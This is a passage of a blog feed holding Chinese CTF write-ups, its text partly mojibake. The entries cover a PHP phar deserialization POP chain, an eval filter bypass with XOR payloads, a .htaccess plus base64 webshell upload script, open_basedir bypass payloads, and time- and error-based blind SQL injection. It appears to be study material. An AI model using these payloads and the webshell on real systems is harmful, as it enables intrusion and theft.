    <content type="html"><![CDATA[<h2 id="â€˜-â€™"><a href="#â€˜-â€™" class="headerlink" title="â€˜__â€™"></a>â€˜__â€™</h2><p><img src="https://ae03.alicdn.com/kf/Ub16431fd83624f07b158ba34f22c3a5c8.jpg" alt="01.png">      </p><p>ä¸€å¼€å§‹ä¸Šä¼ æ–‡ä»¶ï¼Œè¯•äº†ä¸€æ³¢ï¼Œæ„Ÿè§‰ä¸è¡Œ<br>æŸ¥çœ‹æ–‡ä»¶é‡Œä¹Ÿæ²¡æœ‰ä¸Šä¼ çš„æ–‡ä»¶ï¼Œurlå˜æˆäº†è¿™<code>http://c8f4d1a6-6922-4386-b8ad-5454fdc52a38.node3.buuoj.cn/file.php?file=</code>æ„Ÿè§‰å¯ä»¥ä¼ªåè®®è¯»å–ä¸€æ³¢æ–‡ä»¶ï¼Œç½‘é¡µæ³¨é‡Šä¸­<code>flag is in f1ag.php</code>ä½†æ²¡æ³•ç›´æ¥è¯»flagï¼Œä½†è¯»ä¸å‡ºæ¥ï¼Œçœ‹äº†WPï¼Œåé¢ç›´æ¥åŠ æ–‡ä»¶åå°±è¡Œäº†ï¼Œä¸ç”¨ä¼ªåè®®ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚          </p><p><code>index.php</code>       </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> header(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;base.php&#x27;</span>;<span class="hljs-meta">?&gt;</span> ``` `base.php`       ![<span class="hljs-number">02.</span>png](https:<span class="hljs-comment">//ae02.alicdn.com/kf/Ucdb358cbcd1143c9900976dbb1f9fd8aL.jpg)    </span>   `file.php`      ![<span class="hljs-number">03.</span>png](https:<span class="hljs-comment">//ae03.alicdn.com/kf/U376206dfb980446d9bfe46fee0ea095d9.jpg)   </span>     `function.php`      ![<span class="hljs-number">04.</span>png](https:<span class="hljs-comment">//ae03.alicdn.com/kf/Ud189e385babc4686ab45f6222c6dfaeaK.jpg)  </span>     `<span class="hljs-keyword">class</span>.php`        ```php <span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $test;    <span class="hljs-keyword">public</span> $str;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$name</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;str = $name;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;test = <span class="hljs-keyword">$this</span>-&gt;str;        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;test;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $source;    <span class="hljs-keyword">public</span> $str;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$file</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;source = $file;   <span class="hljs-comment">//$this-&gt;source = phar://phar.jpg</span>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;source;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        $content = <span class="hljs-keyword">$this</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]-&gt;source;        <span class="hljs-keyword">return</span> $content;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params">$key,$value</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;$key = $value;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_show</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="hljs-keyword">$this</span>-&gt;source)) &#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);        &#125; <span class="hljs-keyword">else</span> &#123;            highlight_file(<span class="hljs-keyword">$this</span>-&gt;source);        &#125;            &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;source)) &#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker~&quot;</span>;            <span class="hljs-keyword">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;        &#125;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $file;    <span class="hljs-keyword">public</span> $params;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;params = <span class="hljs-keyword">array</span>();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params">$key</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get($key);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params">$key</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;params[$key])) &#123;            $value = <span class="hljs-keyword">$this</span>-&gt;params[$key];        &#125; <span class="hljs-keyword">else</span> &#123;            $value = <span class="hljs-string">&quot;index.php&quot;</span>;        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;file_get($value);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">file_get</span>(<span class="hljs-params">$value</span>)</span><span class="hljs-function">    </span>&#123;        $text = base64_encode(file_get_contents($value));        <span class="hljs-keyword">return</span> $text;    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>ä¸»è¦å°±æ˜¯è¿™ä¸ªclass.php<br>æ²¡æœ‰<code>unserialize</code><br>åº”è¯¥æ˜¯pharäº†<br>çœ‹ä¸€ä¸‹ï¼Œæ²¡è¿‡æ»¤         </p><p>popé“¾<br><code>C1e4r-&gt;__destruct-&gt;Show-&gt;__toString-&gt;Test-&gt;__get-&gt;get()</code>        </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $test;    <span class="hljs-keyword">public</span> $str;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;str=<span class="hljs-keyword">new</span> Show();    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $source;    <span class="hljs-keyword">public</span> $str;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]=<span class="hljs-keyword">new</span> Test();    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $file;    <span class="hljs-keyword">public</span> $params;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;params[<span class="hljs-string">&#x27;source&#x27;</span>]=<span class="hljs-string">&quot;/var/www/html/f1ag.php&quot;</span>;    &#125;&#125;$c1e4r = <span class="hljs-keyword">new</span> C1e4r();$phar = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&quot;exp.phar&quot;</span>); <span class="hljs-comment">//.pharæ–‡ä»¶</span>$phar-&gt;startBuffering();$phar-&gt;setStub(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>); <span class="hljs-comment">//å›ºå®šçš„</span>$phar-&gt;setMetadata($c1e4r); <span class="hljs-comment">//è§¦å‘çš„å¤´æ˜¯C1e4rç±»ï¼Œæ‰€ä»¥ä¼ å…¥C1e4rå¯¹è±¡</span>$phar-&gt;addFromString(<span class="hljs-string">&quot;exp.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//éšä¾¿å†™ç‚¹ä»€ä¹ˆç”Ÿæˆä¸ªç­¾å</span>$phar-&gt;stopBuffering();<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>ç”Ÿæˆçš„pharæ–‡ä»¶åç¼€æ”¹ä¸º<code>array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;)ä¹‹ä¸­çš„</code><br>ä¸Šä¼ <br><code>/upload/</code>â€”â€“&gt;ç›®å½•å¼€ç€ï¼ˆè¿˜å¯ä»¥è¿™æ ·ã€‚ã€‚ã€‚ï¼‰<br><img src="https://sc04.alicdn.com/kf/U7ef653ef22384f92b3c62d63c9147bf27.jpg" alt="06.png"><br>å¤åˆ¶æ–‡ä»¶åï¼Œè®¿é—®å³å¯å¾—åˆ°flag<br><img src="https://ae03.alicdn.com/kf/U8f7e66d8be4549688e1d94f262ca86f6I.jpg" alt="05.png">      </p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>EasyWeb</title>
    <link href="/2021/04/12/BUU68/"/>
    <url>/2021/04/12/BUU68/</url>
    
    <content type="html"><![CDATA[<h2 id="n-A-n"><a href="#n-A-n" class="headerlink" title="n_A_n"></a><code>n_A_n</code></h2><pre><code><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_the_flag</span>(<span class="hljs-params"></span>)</span>&#123;    <span class="hljs-comment">// webadmin will remove your upload file every 20 min!!!! </span>    $userdir = <span class="hljs-string">&quot;upload/tmp_&quot;</span>.md5($_SERVER[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);    <span class="hljs-keyword">if</span>(!file_exists($userdir))&#123;    mkdir($userdir);    &#125;    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>($_FILES[<span class="hljs-string">&quot;file&quot;</span>]))&#123;        $tmp_name = $_FILES[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>];        $name = $_FILES[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];        $extension = substr($name, strrpos($name,<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);     <span class="hljs-comment">##æ–‡ä»¶åç¼€</span>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/ph/i&quot;</span>,$extension)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>);         <span class="hljs-keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="hljs-string">&#x27;&lt;?&#x27;</span>)!==<span class="hljs-literal">False</span>) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>);  <span class="hljs-comment">##æ–‡ä»¶ä¸­è¿‡æ»¤äº†&lt;?</span>    <span class="hljs-keyword">if</span>(!exif_imagetype($tmp_name)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>);   <span class="hljs-comment">##å¤´æ–‡ä»¶æ£€æµ‹</span>        $path= $userdir.<span class="hljs-string">&quot;/&quot;</span>.$name;        @move_uploaded_file($tmp_name, $path);        print_r($path);    &#125;&#125;$hhh = @$_GET[<span class="hljs-string">&#x27;_&#x27;</span>];<span class="hljs-keyword">if</span> (!$hhh)&#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;<span class="hljs-keyword">if</span>(strlen($hhh)&gt;<span class="hljs-number">18</span>)&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;One inch long, one inch strong!&#x27;</span>);&#125;<span class="hljs-keyword">if</span> ( preg_match(<span class="hljs-string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, $hhh) )    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Try something else!&#x27;</span>);$character_type = count_chars($hhh, <span class="hljs-number">3</span>);<span class="hljs-keyword">if</span>(strlen($character_type)&gt;<span class="hljs-number">12</span>) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Almost there!&quot;</span>);<span class="hljs-keyword">eval</span>($hhh);<span class="hljs-meta">?&gt;</span>```      æ•°å­—ï¼Œå­—æ¯éƒ½è¢«è¿‡äº†ï¼Œç”¨å¼‚æˆ–       è¦å¼‚æˆ–æµè§ˆå™¨ä¸èƒ½è§£ç çš„ä¸å¯è§çš„å­—ç¬¦    [å¤§ä½¬çš„è„šæœ¬](https:<span class="hljs-comment">//blog.csdn.net/weixin_43940853/article/details/103749357?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-4.control&amp;dist_request_id=1330144.34969.16182323962248803&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-4.control)        </span>```pythonimport <span class="hljs-keyword">string</span>ee= <span class="hljs-keyword">string</span>.printable<span class="hljs-keyword">print</span>(ee)   <span class="hljs-comment">##è¾“å‡ºå¯æ‰“å°å­—ç¬¦</span>a= map(lambda x:x.encode(<span class="hljs-string">&quot;hex&quot;</span>),<span class="hljs-keyword">list</span>(ee))_=[]G=[]E=[]T=[]<span class="hljs-keyword">print</span>(<span class="hljs-keyword">list</span>(ee))<span class="hljs-keyword">for</span> i in range(<span class="hljs-number">256</span>):    <span class="hljs-keyword">for</span> j in range(<span class="hljs-number">256</span>):        <span class="hljs-keyword">if</span> (chr(i) not in <span class="hljs-keyword">list</span>(ee)) &amp; (chr(j) not in <span class="hljs-keyword">list</span>(ee)):            tem = i^j            <span class="hljs-keyword">if</span> chr(tem)==<span class="hljs-string">&quot;_&quot;</span>:                temp=[]                temp.append(hex(i)[<span class="hljs-number">2</span>:] + <span class="hljs-string">&quot;^&quot;</span> + str(hex(j))[<span class="hljs-number">2</span>:])         <span class="hljs-comment">##è½¬ä¸ºåå…­è¿›åˆ¶æ˜¯ä¸ºäº†ç¼©çŸ­é•¿åº¦</span>                _.append(temp)            <span class="hljs-keyword">if</span> chr(tem)==<span class="hljs-string">&quot;G&quot;</span>:                temp=[]                temp.append(hex(i)[<span class="hljs-number">2</span>:] + <span class="hljs-string">&quot;^&quot;</span> + str(hex(j))[<span class="hljs-number">2</span>:])                G.append(temp)            <span class="hljs-keyword">if</span> chr(tem)==<span class="hljs-string">&quot;E&quot;</span>:                temp=[]                temp.append(hex(i)[<span class="hljs-number">2</span>:] + <span class="hljs-string">&quot;^&quot;</span> + str(hex(j))[<span class="hljs-number">2</span>:])                E.append(temp)            <span class="hljs-keyword">if</span> chr(tem)==<span class="hljs-string">&quot;T&quot;</span>:                temp=[]                temp.append(hex(i)[<span class="hljs-number">2</span>:] + <span class="hljs-string">&quot;^&quot;</span> + str(hex(j))[<span class="hljs-number">2</span>:])                T.append(temp)<span class="hljs-keyword">print</span>(_)<span class="hljs-keyword">print</span>(G)<span class="hljs-keyword">print</span>(E)<span class="hljs-keyword">print</span>(T)</code></pre></code></pre><p>æ„é€ <code>$_GET[a]();&amp;a=phpinfo</code><br><img src="https://sc02.alicdn.com/kf/U71602567344d4ae2afee14ccff8f185ek.jpg" alt="01.png"><br>payload:<code>$&#123;%df%c7%c5%d4^%80%80%80%80&#125;&#123;%80&#125;();&amp;%80=phpinfo</code>    </p><p>ç„¶åæ‰§è¡Œ<code>get_the_flag()</code>å‡½æ•°<br><code>$&#123;%df%c7%c5%d4^%80%80%80%80&#125;&#123;%80&#125;();&amp;%80=get_the_flag</code>       </p><p>ä¸Šä¼ æ–‡ä»¶<br>è¿‡æ»¤äº†<code>ph/i</code><br>è€ƒè™‘<code>.user.ini</code>æˆ–è€…<code>.htaccess</code><br><code>.user.ini</code>éœ€è¦ä¸Šä¼ çš„ç›®å½•é‡Œæœ‰å¯æ‰§è¡Œçš„PHPæ–‡ä»¶ï¼Œè¿™é‡Œæ˜¾ç„¶æ²¡æœ‰         </p><p><code>.htaccess</code><br>å› ä¸ºæœ‰å¤´æ–‡ä»¶æ£€æµ‹ï¼Œä¸€èˆ¬ç”¨GIF89aï¼Œçœ‹WPè¯´æ˜¯ä¼šä½¿æ–‡ä»¶å¤±æ•ˆï¼›æˆ‘è¯•äº†ä¸‹ï¼Œå‘ç°ä¸Šä¼ å¤±è´¥ï¼›ç”¨<code>#define width 1337#define height 1337 </code>å¯ä»¥ç»•è¿‡   </p><pre><code>    #define width 1337    #define height 1337    AddType application/x-httpd-php .ahhh    ##å°†.ahhhåç¼€çš„æ–‡ä»¶ä»¥PHPè§£æ    php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shell.ahhh </code></pre><p>æœ€åä¸€å¥çš„è§£é‡Šï¼š<br><img src="https://ae02.alicdn.com/kf/Ued9c20fc4b034016b3961677278461e7l.jpg" alt="05.png">    </p><p>è¿‡æ»¤äº†<code>&lt;?</code><br><code>&lt;script language=&quot;php&quot;&gt;system(&#39;cat /flag&#39;);&lt;/script&gt;</code>ä¹Ÿä¸èƒ½ç”¨ï¼Œphpç‰ˆæœ¬7.xçš„         </p><p>base64ç¼–ç ï¼Œåœ¨<code>.htaccess</code>é‡Œè§£ç          </p><p><a href="https://blog.csdn.net/qq_42967398/article/details/105615235">å¤§ä½¬çš„ä¸Šä¼ è„šæœ¬</a>         </p><pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> base64htaccess = <span class="hljs-string">b&quot;&quot;&quot;</span><span class="hljs-string">#define width 1337</span><span class="hljs-string">#define height 1337</span><span class="hljs-string">AddType application/x-httpd-php .ahhh</span><span class="hljs-string">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shell.ahhh&quot;</span><span class="hljs-string">&quot;&quot;&quot;</span>shell = <span class="hljs-string">b&quot;GIF89a12&quot;</span> + base64.b64encode(<span class="hljs-string">b&quot;&lt;?php eval($_REQUEST[&#x27;cmd&#x27;]);?&gt;&quot;</span>)url = <span class="hljs-string">&quot;http://2f470aa2-5472-401e-b146-efd0864251a5.node3.buuoj.cn/?_=$&#123;%df%c7%c5%d4^%80%80%80%80&#125;&#123;%80&#125;();&amp;%80=get_the_flag&quot;</span>files = &#123;<span class="hljs-string">&#x27;file&#x27;</span>:(<span class="hljs-string">&#x27;.htaccess&#x27;</span>,htaccess,<span class="hljs-string">&#x27;image/jpeg&#x27;</span>)&#125;data = &#123;<span class="hljs-string">&quot;upload&quot;</span>:<span class="hljs-string">&quot;Submit&quot;</span>&#125;response = requests.post(url=url, data=data, files=files)print(response.text)files = &#123;<span class="hljs-string">&#x27;file&#x27;</span>:(<span class="hljs-string">&#x27;shell.ahhh&#x27;</span>,shell,<span class="hljs-string">&#x27;image/jpeg&#x27;</span>)&#125;response = requests.post(url=url, data=data, files=files)print(response.text)</code></pre></code></pre><p><img src="https://ae04.alicdn.com/kf/U8ab36d268f2c4e338ff91bd9e73355d6W.jpg" alt="02.png">         </p><p>è®¿é—®ä¸€å¥è¯æ–‡ä»¶ï¼Œ<img src="https://ae02.alicdn.com/kf/U1b0011f9ec664565ad977d32c46423b74.jpg" alt="03.png"><br>å¯ç”¨<br>ä½†æ²¡æ³•ç›´æ¥è¯»æ–‡ä»¶<br>éœ€è¦ç»•è¿‡<code>open_basedir</code>          </p><p><a href="https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/#%E5%89%8D%E8%A8%80">ä»PHPåº•å±‚çœ‹open_basedir bypass</a>         </p><p>payload:<code>cmd=chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);var_dump(scandir(&quot;/&quot;));</code><img src="https://ae03.alicdn.com/kf/U043edb17de044c79b82910e8d280915b7.jpg" alt="04.png">         </p><p>payload:<code>cmd=chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);var_dump(file_get_contents(&quot;/THis_Is_tHe_F14g&quot;));</code></p><p>å¾—åˆ°flag       </p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL</title>
    <link href="/2021/04/11/SQL/"/>
    <url>/2021/04/11/SQL/</url>
    
    <content type="html"><![CDATA[<h2 id="time-injection"><a href="#time-injection" class="headerlink" title="time injection"></a>time injection</h2><h3 id="benchmarkå‡½æ•°"><a href="#benchmarkå‡½æ•°" class="headerlink" title="benchmarkå‡½æ•°"></a>benchmarkå‡½æ•°</h3><p><code>BENCHMARK(loop_count,expr)</code><br>loop_countæ˜¯é‡å¤æ‰§è¡Œçš„æ¬¡æ•°ï¼Œexpræ˜¯è¦æ‰§è¡Œçš„è¡¨è¾¾å¼       </p><pre><code>mysql&gt; select benchmark(100000000,1+1);+--------------------------+| benchmark(100000000,1+1) |+--------------------------+|                        0 |+--------------------------+1 row in set (1.48 sec)        </code></pre><p>ä»¥æ­¤ç»“åˆandè¿›è¡Œæ—¶é—´ç›²æ³¨        </p><pre><code>1=1å»¶æ—¶mysql&gt; select * from guestbook where comment_id=1 and 1=1 and benchmark(10000000,sha(1));Empty set (2.04 sec)1=0ï¼Œä¸ä¼šå»¶æ—¶mysql&gt; select * from guestbook where comment_id=1 and 1=0 and benchmark(10000000,sha(1));Empty set (0.00 sec)</code></pre><p>ä»¥<code>sqllab-less-9</code>ä¸ºä¾‹<br><img src="https://ae04.alicdn.com/kf/U4e8dd5045c0d4f279cefe3efd1232931i.jpg" alt="01.png"><br>payloadï¼š<code>1&#39; and ascii(substr(database(),1,1))&gt;0 and(benchmark(10000000,sha(1)))%23</code>      </p><p>###ç¬›å¡å°”ç§¯<br>ç¬›å¡å°”ç§¯ï¼š   </p><p><img src="https://ae02.alicdn.com/kf/U3af545a58a114e0d89199d96773005e5y.jpg"></p><pre><code>mysql&gt; select count(*) from information_schema.tables;+----------+| count(*) |+----------+|      287 |+----------+1 row in set (0.00 sec)       </code></pre><p>åé¢è¿˜å¯ä»¥åŠ å…¶ä»–åˆ—æˆ–è€…è¡¨ï¼Œä»è€Œä½¿å…¶è®¡ç®—èŠ±è´¹çš„æ—¶é—´ä¸åŒ<img src="https://ae03.alicdn.com/kf/Ua5f6439e6b1b43ec9fa741c0cd281150k.jpg" alt="02.png">       </p><pre><code>1=1 å»¶æ—¶mysql&gt; select * from guestbook where comment_id=1 and 1=1 and(select count(*) from information_schema.columns,information_schema.tables A,information_schema.tables B);+------------+-------------------------+------+| comment_id | comment                 | name |+------------+-------------------------+------+|          1 | This is a test comment. | test |+------------+-------------------------+------+1 row in set (11.73 sec)1=0  ä¸ä¼šå»¶æ—¶mysql&gt; select * from guestbook where comment_id=1 and 1=0 and(select count(*) from information_schema.columns,information_schema.tables A,information_schema.tables B);Empty set (0.00 sec)</code></pre><p>ä¾æ—§å¯ä»¥ä»¥andè¿æ¥æ„é€ æ—¶é—´ç›²æ³¨        </p><p>payloadï¼š<code>1&#39; and ascii(substr(database(),1,1))&gt;0 and(select count(*) from information_schema.columns,information_schema.tables A,information_schema.tables B)#</code>     </p><h3 id="rpadè®¡ç®—å»¶æ—¶æ³¨å…¥"><a href="#rpadè®¡ç®—å»¶æ—¶æ³¨å…¥" class="headerlink" title="rpadè®¡ç®—å»¶æ—¶æ³¨å…¥"></a>rpadè®¡ç®—å»¶æ—¶æ³¨å…¥</h3><p><code>RPAD(str,len,padstr)</code><br>è¿”å›lené•¿åº¦çš„strï¼Œä¸å¤Ÿçš„è¯ç”¨padstrè¡¥ï¼Œè‹¥stré•¿åº¦å¤§äºlen,è¿”å›lené•¿åº¦çš„str<br><img src="https://img11.360buyimg.com/ddimg/jfs/t1/168746/13/20334/153366/6081a718E1897bbec/8ee657df0325bc7f.png" alt="03.png">       </p><p><code>expr REGEXP pat</code><br>åœ¨exprä¸­åŒ¹é…pat<br>regexpå’ŒrlikeåŒä¹‰           </p><p><img src="https://img10.360buyimg.com/ddimg/jfs/t1/178891/22/548/169658/6081a71aE5caf9f70/c753df4964ed571e.png" alt="04.png">     </p><pre><code>payloadï¼š select * from users where id=`1 and if(1=0,concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;,1);`       </code></pre><p><img src="https://img14.360buyimg.com/ddimg/jfs/t1/168677/32/20502/382379/6081a8c3E3c16a0e2/92b76f71f50d585f.png" alt="05.png">       </p><p>ç”¨Levelè¯•äº†ä¸€ä¸‹ï¼Œä¼¼ä¹æ²¡æœ‰æˆåŠŸï¼Ÿï¼Ÿï¼Ÿï¼Ÿ<img src="https://img12.360buyimg.com/ddimg/jfs/t1/168088/38/20288/29526/60826e5cE14244722/a813234e542af029.png" alt="06.png">      </p><h3 id="æ•´æ•°æº¢å‡ºæŠ¥é”™"><a href="#æ•´æ•°æº¢å‡ºæŠ¥é”™" class="headerlink" title="æ•´æ•°æº¢å‡ºæŠ¥é”™"></a>æ•´æ•°æº¢å‡ºæŠ¥é”™</h3><p>pow      </p><p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/164691/39/20277/134557/608272e2E8727852f/f762dd563901c2b4.png" alt="07.png">          </p><p>æ®æ­¤å¯ä»¥è¿›è¡Œå¸ƒå°”ç›²æ³¨     </p><p>cot(x)â€”â€“&gt;è¿”å›xçš„ä½™åˆ‡      </p><pre><code>mysql&gt; select cot(0);ERROR 1690 (22003): DOUBLE value is out of range in &#39;cot(0)&#39;       </code></pre><p><code>exp(x)</code>â€”-&gt;è¿”å›eçš„xæ¬¡å¹‚      </p><pre><code>mysql&gt; select exp(999);ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(999)&#39;      </code></pre><p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/161575/36/20404/34820/608273efEd1d27c04/8b75729a41fd958f.png" alt="08.png">       </p><h3 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h3><p>insertæŠ¥é”™å’Œæ—¶é—´<br><img src="https://img11.360buyimg.com/ddimg/jfs/t1/161571/22/20489/162255/60827dcdE2d218ad0/9f97136a365a1ece.png" alt="09.png">       </p><p>updateæŠ¥é”™å’Œæ—¶é—´<br><img src="https://img13.360buyimg.com/ddimg/jfs/t1/175936/24/6042/226619/60827f68E3da3cadf/b1618cab9168f4d8.png" alt="10.png">     </p><p>deleteæŠ¥é”™å’Œæ—¶é—´<br><img src="https://img13.360buyimg.com/ddimg/jfs/t1/162426/35/20725/86138/60827f68E8d2fa007/af3811c27c90d2bc.png" alt="11.png">       </p><hr><p><a href="https://xz.aliyun.com/t/5505">MORE</a></p>]]></content>
